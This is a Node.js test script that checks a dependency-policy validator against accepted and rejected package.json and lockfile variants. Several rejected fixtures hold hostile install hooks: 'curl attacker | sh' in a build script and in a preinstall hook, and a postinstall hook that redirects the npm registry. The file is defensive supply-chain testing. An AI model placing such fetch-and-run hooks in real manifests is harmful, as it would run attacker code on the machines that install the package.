#!/usr/bin/env node

import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import {
  validateRuntimeDependencyFiles,
} from "../validate-runtime-dependency-policy.mjs";

const root = fs.mkdtempSync(path.join(os.tmpdir(), "preview-runtime-policy-"));
const write = (name, value) => {
  const file = path.join(root, name);
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, typeof value === "string" ? value : JSON.stringify(value));
  return file;
};
const expectFailure = (fn, pattern) => assert.throws(fn, pattern);

try {
  const trusted = { name: "api", version: "1.0.0", type: "module", scripts: { preflight: "node check-node.js", build: "tsc" }, engines: { node: ">=20 <21" }, engineStrict: true, dependencies: { express: "1.0.0" } };
  const candidate = { ...trusted, dependencies: { express: "1.0.0", sharp: "0.35.3" } };
  const lock = {
    name: "api",
    version: "1.0.0",
    lockfileVersion: 3,
    packages: {
      "": { name: "api", version: "1.0.0", dependencies: candidate.dependencies, engines: candidate.engines },
      "node_modules/express": { version: "1.0.0", resolved: "https://registry.npmjs.org/express/-/express-1.0.0.tgz", integrity: "sha512-express" },
      "node_modules/sharp": { version: "0.35.3", resolved: "https://registry.npmjs.org/sharp/-/sharp-0.35.3.tgz", integrity: "sha512-sharp" },
    },
  };
  const trustedFile = write("trusted.json", trusted);
  const candidateFile = write("candidate.json", candidate);
  const lockFile = write("candidate-lock.json", lock);

  const trustedLock = { ...lock, packages: { ...lock.packages, "": { ...lock.packages[""], dependencies: trusted.dependencies } } };
  const trustedLockFile = write("trusted-lock.json", trustedLock);
  const validate = (packagePath, lockPath) => validateRuntimeDependencyFiles({ trustedPackagePath: trustedFile, trustedLockPath: trustedLockFile, candidatePackagePath: packagePath, candidateLockPath: lockPath });
  validate(trustedFile, trustedLockFile);
  validate(candidateFile, lockFile);

  const node24 = { ...candidate, engines: { node: ">=24 <25" } };
  const node24File = write("node24.json", node24);
  const node24Lock = { ...lock, packages: { ...lock.packages, "": { ...lock.packages[""], engines: node24.engines } } };
  const node24LockFile = write("node24-lock.json", node24Lock);
  validate(node24File, node24LockFile);

  const node24WithoutDependencyChange = { ...trusted, engines: { node: ">=24 <25" } };
  const node24WithoutDependencyChangeFile = write("node24-only.json", node24WithoutDependencyChange);
  const node24OnlyLockFile = write("node24-only-lock.json", { ...trustedLock, packages: { ...trustedLock.packages, "": { ...trustedLock.packages[""], engines: node24WithoutDependencyChange.engines } } });
  validate(node24WithoutDependencyChangeFile, node24OnlyLockFile);

  const changedScript = write("changed-script.json", { ...candidate, scripts: { build: "curl attacker | sh" } });
  expectFailure(() => validate(changedScript, lockFile), /Only governed dependency maps/);
  for (const [name, node] of [["node22", ">=22 <23"], ["node25", ">=25 <26"], ["wide-old", ">=20"], ["wide-transition", ">=20 <25"], ["wide-new", ">=24"], ["wide-future", ">=24 <26"], ["wildcard", "*"], ["arbitrary", "runtime-24"]]) {
    const invalid = write(`${name}.json`, { ...candidate, engines: { node } });
    expectFailure(() => validate(invalid, lockFile), /Unapproved Node engine transition/);
  }
  const noEngines = { ...candidate };
  delete noEngines.engines;
  expectFailure(() => validate(write("no-engines.json", noEngines), lockFile), /engines/);
  expectFailure(() => validate(write("extra-engine.json", { ...candidate, engines: { ...candidate.engines, npm: "10" } }), lockFile), /engines/);
  expectFailure(() => validate(write("engine-strict-off.json", { ...candidate, engineStrict: false }), lockFile), /engineStrict/);
  const noEngineStrict = { ...candidate };
  delete noEngineStrict.engineStrict;
  expectFailure(() => validate(write("no-engine-strict.json", noEngineStrict), lockFile), /engineStrict/);
  expectFailure(() => validate(write("package-manager.json", { ...candidate, packageManager: "npm@11" }), lockFile), /Only governed dependency maps/);
  expectFailure(() => validate(write("changed-type.json", { ...candidate, type: "commonjs" }), lockFile), /Only governed dependency maps/);
  expectFailure(() => validate(write("changed-version.json", { ...candidate, version: "2.0.0" }), lockFile), /Only governed dependency maps/);
  expectFailure(() => validate(write("preinstall.json", { ...candidate, scripts: { ...candidate.scripts, preinstall: "curl attacker | sh" } }), lockFile), /Only governed dependency maps/);
  expectFailure(() => validate(write("postinstall.json", { ...candidate, scripts: { ...candidate.scripts, postinstall: "npm config set registry https:\/\/example.invalid" } }), lockFile), /Only governed dependency maps/);
  expectFailure(() => validate(write("unknown-field.json", { ...candidate, runtimePolicy: "relaxed" }), lockFile), /Only governed dependency maps/);
  expectFailure(() => validate(write("registry-metadata.json", { ...candidate, publishConfig: { registry: "https://example.invalid" } }), lockFile), /Only governed dependency maps/);
  const inconsistent = write("inconsistent-lock.json", { ...lock, packages: { ...lock.packages, "": { ...lock.packages[""], dependencies: trusted.dependencies } } });
  expectFailure(() => validate(candidateFile, inconsistent), /does not match/);
  const corrupted = write("corrupted-lock.json", "{not-json");
  expectFailure(() => validate(candidateFile, corrupted), /JSON/);
  const gitSource = write("git-source-lock.json", { ...lock, packages: { ...lock.packages, "node_modules/sharp": { ...lock.packages["node_modules/sharp"], resolved: "git+https://example.invalid/sharp.git" } } });
  expectFailure(() => validate(candidateFile, gitSource), /Unapproved package source/);
  const noIntegrity = write("no-integrity-lock.json", { ...lock, packages: { ...lock.packages, "node_modules/sharp": { version: "0.35.3", resolved: "https://registry.npmjs.org/sharp/-/sharp-0.35.3.tgz" } } });
  expectFailure(() => validate(candidateFile, noIntegrity), /Missing sha512 integrity/);
  const installScript = write("install-script-lock.json", { ...lock, packages: { ...lock.packages, "node_modules/sharp": { ...lock.packages["node_modules/sharp"], hasInstallScript: true } } });
  expectFailure(() => validate(candidateFile, installScript), /install scripts/);
  const wrongEnginesLock = write("wrong-engines-lock.json", { ...node24Lock, packages: { ...node24Lock.packages, "": { ...node24Lock.packages[""], engines: { node: ">=24" } } } });
  expectFailure(() => validate(node24File, wrongEnginesLock), /Lockfile root engines/);
  const unrelatedRootLock = write("unrelated-root-lock.json", { ...lock, packages: { ...lock.packages, "": { ...lock.packages[""], license: "UNLICENSED" } } });
  expectFailure(() => validate(candidateFile, unrelatedRootLock), /Unrelated lockfile root metadata/);
  const unrelatedTopLock = write("unrelated-top-lock.json", { ...lock, runtimePolicy: "relaxed" });
  expectFailure(() => validate(candidateFile, unrelatedTopLock), /Unrelated lockfile metadata/);

  console.log("Preview runtime and package metadata policy validation passed: 4 positive and 28 negative cases");
} finally {
  fs.rmSync(root, { recursive: true, force: true });
}
